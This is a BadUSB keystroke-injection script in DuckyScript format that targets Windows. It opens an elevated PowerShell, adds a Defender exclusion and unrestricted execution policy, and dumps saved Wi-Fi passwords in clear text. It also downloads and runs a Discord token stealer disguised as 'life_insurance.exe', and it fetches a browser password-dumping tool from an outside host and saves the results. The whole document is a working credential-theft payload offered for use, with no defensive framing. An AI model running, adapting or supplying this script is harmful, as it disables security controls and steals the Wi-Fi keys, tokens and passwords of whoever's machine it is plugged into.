GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 3000
ALT y
DELAY 2500
ENTER
DELAY 500
STRING cd C:\ ; mkdir temp ; cd temp ; Add-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy unrestricted
ENTER
DELAY 500
STRING A
ENTER
STRING clear
ENTER
REM WIFI EXFIL
STRING netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace '.xml:22:', ''} > Wi-fi.txt
ENTER
DELAY 500
REM END OF WIFI EXFIL
REM Discord token exfil
STRING $url = 'https://github.com/CharlesTheGreat77/token2Discord/raw/main/token2Discord.exe'; $file = 'C:\temp\life_insurance.exe'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process -FilePath $file
ENTER
DELAY 15000
ENTER
DELAY 500
REM END OF Discord EXFIL
DELAY 1000
REM Browser password exfil
STRING Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip;
ENTER
DELAY 5000
STRING .\WebBrowserPassView.exe
ENTER
DELAY 5000
CTRL A
DELAY 500
CTRL S
DELAY 1500
STRING temp.html
ENTER
DELAY 500
ALT f
DELAY 500
DOWN
DOWN
ENTER
DELAY 3000
ENTER
ENTER
STRING exit
ENTER